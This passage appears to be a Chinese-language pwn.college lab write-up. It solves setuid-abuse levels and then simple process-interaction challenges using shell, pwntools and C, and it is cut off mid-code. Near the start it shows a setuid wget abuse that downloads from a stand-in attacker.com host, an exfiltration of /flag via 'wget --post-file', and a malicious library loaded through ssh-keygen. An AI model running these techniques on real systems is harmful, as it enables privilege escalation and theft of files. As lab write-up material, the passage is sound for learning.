class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">LFILE=file_to_write<br>TF=$(<span class="hljs-built_in">mktemp</span>)<br><span class="hljs-built_in">echo</span> DATA &gt; <span class="hljs-variable">$TF</span><br>wget -i <span class="hljs-variable">$TF</span> -o <span class="hljs-variable">$LFILE</span><br><br>LFILE=file_to_read<br>wget -i <span class="hljs-variable">$LFILE</span><br><br><br>sudo install -m =xs $(<span class="hljs-built_in">which</span> wget) .<br>URL=http://attacker.com/file_to_get<br>LFILE=file_to_save<br>./wget <span class="hljs-variable">$URL</span> -O <span class="hljs-variable">$LFILE</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level50:/$ wget --post-file=/flag http://127.0.0.1:8000<br>--2022-11-15 11:00:17--  http://127.0.0.1:8000/<br>Connecting to 127.0.0.1:8000... connected.<br>HTTP request sent, awaiting response... <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level50:/$ nc -lvnp 8000<br>Listening on 0.0.0.0 8000<br>Connection received on 127.0.0.1 60960<br>POST / HTTP/1.1<br>User-Agent: Wget/1.20.3 (linux-gnu)<br>Accept: */*<br>Accept-Encoding: identity<br>Host: 127.0.0.1:8000<br>Connection: Keep-Alive<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 56<br><br>pwn.college&#123;&#125;<br></code></pre></td></tr></table></figure><h2 id="L51"><a class="header-anchor" href="#L51">Â¶</a>L51</h2><p>ç¼–è¯‘ä¸€ä¸ªåŠ¨æ€åº“ï¼Œä¸€ç›´æç¤ºç¼ºè¿™ä¸ªå‡½æ•°æˆ‘ä»¬å°±å†™è¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">C_GetFunctionList</span><span class="hljs-params">()</span>&#123;<br>    sendfile(<span class="hljs-number">1</span>,open(<span class="hljs-string">&quot;/flag&quot;</span>,<span class="hljs-number">0</span>),<span class="hljs-number">0</span>,<span class="hljs-number">4096</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@babysuid_level51:~$ gcc fuck.c -shared -o fuck.so<br>hacker@babysuid_level51:~$ /usr/bin/ssh-keygen -D ./fuck.so<br></code></pre></td></tr></table></figure><h1>Program Interaction</h1><h2 id="L1-v3"><a class="header-anchor" href="#L1-v3">Â¶</a>L1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash<br></code></pre></td></tr></table></figure><h2 id="L2-v3"><a class="header-anchor" href="#L2-v3">Â¶</a>L2</h2><p>åŒä¸Šä½†æ˜¯è¾“å…¥å¯†ç </p><h2 id="L3-v2"><a class="header-anchor" href="#L3-v2">Â¶</a>L3</h2><p>åˆ‡æ¢åˆ° bash ç»™ chal ä¼ å‚å³å¯</p><h2 id="L4-v2"><a class="header-anchor" href="#L4-v2">Â¶</a>L4</h2><p>è®¾ç½®å˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level4:/$ flphkv=ntjiqinwnr /challenge/embryoio_level4 <br></code></pre></td></tr></table></figure><h2 id="L5-v2"><a class="header-anchor" href="#L5-v2">Â¶</a>L5</h2><p>è¾“å…¥å®šå‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level5:/$ <span class="hljs-built_in">touch</span> /tmp/qggcqx<br>hacker@embryoio_level5:/$ <span class="hljs-built_in">echo</span> hpquyjvp &gt; /tmp/qggcqx <br>hacker@embryoio_level5:/$ /challenge/embryoio_level5 &lt; /tmp/qggcqx <br></code></pre></td></tr></table></figure><h2 id="L6-v2"><a class="header-anchor" href="#L6-v2">Â¶</a>L6</h2><p>è¾“å‡ºå®šå‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level6:/$ /challenge/embryoio_level6 &gt; /tmp/tdecqv<br></code></pre></td></tr></table></figure><h2 id="L7-v2"><a class="header-anchor" href="#L7-v2">Â¶</a>L7</h2><p>æš‚æ—¶ä¸å¸¦ç¯å¢ƒå˜é‡æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level7:/$ <span class="hljs-built_in">env</span> -i /challenge/embryoio_level7 <br></code></pre></td></tr></table></figure><h2 id="L8-v2"><a class="header-anchor" href="#L8-v2">Â¶</a>L8</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/challenge/embryoio_level8<br></code></pre></td></tr></table></figure><h2 id="L9-v2"><a class="header-anchor" href="#L9-v2">Â¶</a>L9</h2><p>åŒä¸Šï¼Œè¾“å…¥è‡ªå·±è¯»å°±è¡Œ</p><h2 id="L10-v2"><a class="header-anchor" href="#L10-v2">Â¶</a>L10</h2><p>åŒä¸Šï¼Œä¼ ä¸ªå‚å°±è¡Œ</p><h2 id="L11-v2"><a class="header-anchor" href="#L11-v2">Â¶</a>L11</h2><p>åŒä¸Šï¼ŒåŠ ä¸ªå˜é‡</p><h2 id="L12-v2"><a class="header-anchor" href="#L12-v2">Â¶</a>L12</h2><p>stdin å®šå‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> otxfcrvn &gt; /tmp/moceew<br><br><br><span class="hljs-comment">#!/bin/bash</span><br>/challenge/embryoio_level12 &lt; /tmp/moceew<br></code></pre></td></tr></table></figure><h2 id="L13-v2"><a class="header-anchor" href="#L13-v2">Â¶</a>L13</h2><p>stdout å®šå‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/challenge/embryoio_level13 &gt; /tmp/oglwtl<br></code></pre></td></tr></table></figure><h2 id="L14-v2"><a class="header-anchor" href="#L14-v2">Â¶</a>L14</h2><p>env -i</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">env</span> -i /challenge/embryoio_level* <br></code></pre></td></tr></table></figure><h2 id="L22-v2"><a class="header-anchor" href="#L22-v2">Â¶</a>L22</h2><p>subprocess Popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3.8</span><br><span class="hljs-keyword">import</span> subprocess<br>subprocess.Popen(<span class="hljs-string">&#x27;/challenge/embryoio_level22&#x27;</span>)<br><span class="hljs-built_in">input</span>()<br></code></pre></td></tr></table></figure><h2 id="L23-v2"><a class="header-anchor" href="#L23-v2">Â¶</a>L23</h2><p>å¥½åƒå•çº¯çš„è„šæœ¬ä¸èƒ½ç›´æ¥è¾“å…¥ï¼Œè¿™é‡Œè½¬ pwntools äº†ï¼Œä¸å¾—ä¸è¯´ pwntools è¿˜æ˜¯å¼ºçš„ =ã€‚=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pwnlib.tubes.process.process(argv=<span class="hljs-literal">None</span>, shell=<span class="hljs-literal">False</span>, executable=<span class="hljs-literal">None</span>, cwd=<span class="hljs-literal">None</span>, env=<span class="hljs-literal">None</span>, stdin=-<span class="hljs-number">1</span>, stdout=&lt;pwnlib.tubes.process.PTY <span class="hljs-built_in">object</span>&gt;, stderr=-<span class="hljs-number">2</span>, close_fds=<span class="hljs-literal">True</span>, preexec_fn=&lt;function &lt;<span class="hljs-keyword">lambda</span>&gt;&gt;, raw=<span class="hljs-literal">True</span>, aslr=<span class="hljs-literal">None</span>, setuid=<span class="hljs-literal">None</span>, where=<span class="hljs-string">&#x27;local&#x27;</span>, display=<span class="hljs-literal">None</span>, alarm=<span class="hljs-literal">None</span>, *args, **kwargs)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process(<span class="hljs-string">&quot;/challenge/embryoio_level23&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L24-v2"><a class="header-anchor" href="#L24-v2">Â¶</a>L24</h2><p>pwntools ä¼ å‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process([<span class="hljs-string">&quot;/challenge/embryoio_level24&quot;</span>,<span class="hljs-string">&quot;marcdyutqe&quot;</span>])<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L25-v2"><a class="header-anchor" href="#L25-v2">Â¶</a>L25</h2><p>pwntools è®¾ç½® env</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process(<span class="hljs-string">&quot;/challenge/embryoio_level25&quot;</span>,env=&#123;<span class="hljs-string">&quot;iwmvhp&quot;</span>:<span class="hljs-string">&quot;yuabrmvygy&quot;</span>&#125;)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L26-v2"><a class="header-anchor" href="#L26-v2">Â¶</a>L26</h2><p>è™½ç„¶æŠ¥é”™äº†ä½†æ˜¯å‡º flag äº† 2333</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3.8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process(<span class="hljs-string">&quot;/challenge/embryoio_level26&quot;</span>,stdin=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/ioywjl&quot;</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L27-v2"><a class="header-anchor" href="#L27-v2">Â¶</a>L27</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3.8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process(<span class="hljs-string">&quot;/challenge/embryoio_level27&quot;</span>,stdout=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/tmp/kjrxhv&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L28-v2"><a class="header-anchor" href="#L28-v2">Â¶</a>L28</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3.8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>p = process(<span class="hljs-string">&quot;/challenge/embryoio_level28&quot;</span>,env=&#123;&#125;)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="L29-v2"><a class="header-anchor" href="#L29-v2">Â¶</a>L29</h2><p>c å¼€å­è¿›ç¨‹ï¼ŒæŠ„äº†ä¸ªæ¿å­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pwncollege</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> status;<br>    pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">-1</span>)<br>    &#123;<br><br>        <span class="hljs-comment">// pid == -1 means error occurred</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&#x27;t fork, error occurred\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123;<br><br>        <span class="hljs-comment">// pid == 0 means child process created</span><br>        <span class="hljs-comment">// getpid() returns process id of calling process</span><br>        <span class="hljs-comment">// Here It will return process id of child process</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;child process, pid = %u\n&quot;</span>, getpid());<br>        <span class="hljs-comment">// Here It will return Parent of child Process means Parent process it self</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent of child process, pid = %u\n&quot;</span>, getppid());<br><br>        <span class="hljs-comment">// the argv list first argument should point to</span><br>        <span class="hljs-comment">// filename associated with file being executed</span><br>        <span class="hljs-comment">// the array pointer must be terminated by NULL</span><br>        <span class="hljs-comment">// pointer</span><br>        <span class="hljs-type">char</span> *argv_list[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><br>        <span class="hljs-comment">// the execv() only return if error occurred.</span><br>        <span class="hljs-comment">// The return value is -1</span><br>        execv(<span class="hljs-string">&quot;/challenge/embryoio_level29&quot;</span>, argv_list);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-comment">// a positive number is returned for the pid of</span><br>        <span class="hljs-comment">// parent process</span><br>        <span class="hljs-comment">// getppid() returns process id of parent of</span><br>        <span class="hljs-comment">// calling process</span><br>        <span class="hljs-comment">// Here It will return parent of parent process&#x27;s ID</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parent Of parent process, pid = %u\n&quot;</span>, getppid());<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;parent process, pid = %u\n&quot;</span>, getpid());<br><br>        <span class="hljs-comment">// the parent process calls waitpid() on the child</span><br>        <span class="hljs-comment">// waitpid() system call suspends execution of</span><br>        <span class="hljs-comment">// calling process until a child specified by pid</span><br>        <span class="hljs-comment">// argument has changed state</span><br>        <span class="hljs-comment">// see wait() man page for all the flags or options</span><br>        <span class="hljs-comment">// used here</span><br>        <span class="hljs-keyword">if</span> (waitpid(pid, &amp;status, <span class="hljs-number">0</span>) &gt; <span class="hljs-number">0</span>)<br>        &#123;<br><br>            <span class="hljs-keyword">if</span> (WIFEXITED(status) &amp;&amp; !WEXITSTATUS(status))<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;program execution successful\n&quot;</span>);<br><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (WIFEXITED(status) &amp;&amp; WEXITSTATUS(status))<br>            &#123;<br>                <span class="hljs-keyword">if</span> (WEXITSTATUS(status) == <span class="hljs-number">127</span>)<br>                &#123;<br><br>                    <span class="hljs-comment">// execv failed</span><br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;execv failed\n&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;program terminated normally,&quot;</span><br>                           <span class="hljs-string">&quot; but returned a non-zero status\n&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;program didn&#x27;t terminate normally\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// waitpid() failed</span><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;waitpid() failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="L30-v2"><a class="header-anchor" href="#L30-v2">Â¶</a>L30</h2><p>åŒä¸Šï¼Œæ‰‹åŠ¨è¾“å…¥å³å¯ã€‚</p><h2 id="L31-v2"><a class="header-anchor" href="#L31-v2">Â¶</a>L31</h2><p>æ³¨æ„ argv[1] çš„ä½ç½®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execlp(<span class="hljs-string">&quot;/challenge/embryoio_level31&quot;</span>,<span class="hljs-string">&quot;embryoio_level31&quot;</span>,<span class="hljs-string">&quot;gtakxwerut&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="L32-v2"><a class="header-anchor" href="#L32-v2">Â¶</a>L32</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *argv_list[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><span class="hljs-type">char</span> *env_list[] = &#123;<span class="hljs-string">&quot;bouxdv=ilmhqfjeuk&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>execve(<span class="hljs-string">&quot;/challenge/embryoio_level32&quot;</span>,argv_list,env_list);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h2 id="L33-v2"><a class="header-anchor" href="#L33-v2">Â¶</a>L33</h2><p>å· ğŸ” ç‰ˆï¼Œç›´æ¥åœ¨å¤–é¢é‡å®šå‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level33:~$ ./fuck &lt; /tmp/bidnzx<br></code></pre></td></tr></table></figure><p>çœŸæ­£çš„ C è¯­è¨€å—¨å®¢éƒ½è¿™æ ·å†™ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">close(<span class="hljs-number">0</span>);<br>open(<span class="hljs-string">&quot;/tmp/bidnzx&quot;</span>,<span class="hljs-number">0</span>);<br>execv(<span class="hljs-string">&quot;/challenge/embryoio_level33&quot;</span>,argv_list);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¹ˆçœ‹æ¥ execv èµ·çš„ç¨‹åºæ˜¯ç»§æ‰¿äº†åŸæœ¬çš„ filenoï¼Œå…¶å®ä¹Ÿä¸å¥‡æ€ªï¼Œexecve è¿™ç§éƒ½æ˜¯æŠŠåŸæ¥çš„ç¨‹åºå…¨ ğŸ‘ äº†æ¢æˆæ–°ç¨‹åºçš„ã€‚</p><h2 id="L34-v2"><a class="header-anchor" href="#L34-v2">Â¶</a>L34</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">close(<span class="hljs-number">1</span>);<br>open(<span class="hljs-string">&quot;/tmp/demyli&quot;</span>,<span class="hljs-number">2</span>);<br>execv(<span class="hljs-string">&quot;/challenge/embryoio_level34&quot;</span>,argv_list);<br></code></pre></td></tr></table></figure><h2 id="L35-v2"><a class="header-anchor" href="#L35-v2">Â¶</a>L35</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *argv_list[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><span class="hljs-type">char</span> *env_list[] = &#123;<span class="hljs-literal">NULL</span>&#125;;<br><br>execve(<span class="hljs-string">&quot;/challenge/embryoio_level35&quot;</span>,argv_list,env_list);<br></code></pre></td></tr></table></figure><h2 id="L36-v2"><a class="header-anchor" href="#L36-v2">Â¶</a>L36</h2><p>å¯¹ stdout çš„ process æœ‰è¦æ±‚ï¼Œæ„Ÿè§‰æ¯”è¾ƒé«˜çº§äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level36:/$ /challenge/embryoio_level36 |<span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><h2 id="L37-v2"><a class="header-anchor" href="#L37-v2">Â¶</a>L37</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level37:~$ <span class="hljs-built_in">cp</span> /bin/cat ./grep<br>hacker@embryoio_level37:~$ /challenge/embryoio_level37|./grep<br></code></pre></td></tr></table></figure><h2 id="L40-v3"><a class="header-anchor" href="#L40-v3">Â¶</a>L40</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;swzuyilx&quot;</span>,<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;swzuyilx&quot;</span>));<br>    sleep(<span class="hljs-number">3</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hacker@embryoio_level40:~$ gcc fuck.c -o <span class="hljs-built_in">cat</span><br>hacker@embryoio_level40:~$ ./cat|/challenge/embryoio_level40 <br></code></pre></td></tr></table></figure><h2 id="L42-v2"><a class="header-anchor" href="#L42-v2">Â¶</a>L42</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>/challenge/embryoio_level42|<span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><h2 id="L44-v2"><a class="header-anchor" href="#L44-v2">Â¶</a>L44</h2><p>åŒä¸Šï¼Œç›´æ¥ cp è¿‡æ¥å·é¸¡</p><h2 id="L46-v2"><a class="header-anchor" href="#L46-v2">Â¶</a>L46</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    write(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;yxsewuhi&quot;</span>,<span class="hljs-built_in">strlen</span>(<span 